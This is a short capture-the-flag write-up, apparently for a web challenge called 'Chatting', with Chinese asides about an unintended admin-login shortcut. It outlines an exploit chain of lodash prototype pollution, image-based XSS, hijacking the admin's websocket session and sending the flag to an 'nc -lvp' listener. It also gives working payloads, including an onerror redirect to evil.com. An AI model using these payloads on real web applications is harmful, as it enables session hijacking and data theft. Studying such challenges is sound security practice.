# Chatting

~~直接admin登陆getflag~~

（唉应该加个限制admin登陆ip的）

expected exploit approach
1. lodash prototype pollution
2. image xss (many ways)
3. make the admin refresh the browser page and goto a third party site which would connect to the websocket server as a client
4. login as admin, getflag and send it to your favorite `nc -lvp 1337`

### Details

prototype pollution payload:
```js
content: {
    type: 'tpl',
    data: {
        tpl: '<h3>{{b}}</h3>',
        ctx: '{"a":123, "b":123, "__proto__":{"allowImage":true}}'
    }
}
```

xss payload:
```js
content: {
    type: 'image',
    data: {
        src: 'https://i.picsum.photos/id/220/200/200.jpg?hmac=1eed0JUIOlpc-iGslem_jB1FORVXUdRtOmgpHxDDKZQ',
        attrs: {
            wow: 1,
            dangerouslySetInnerHTML: {
                __html: "<img onerror='location.href=`http://evil.com`' src=1>"
            }
        }
    }
}
```
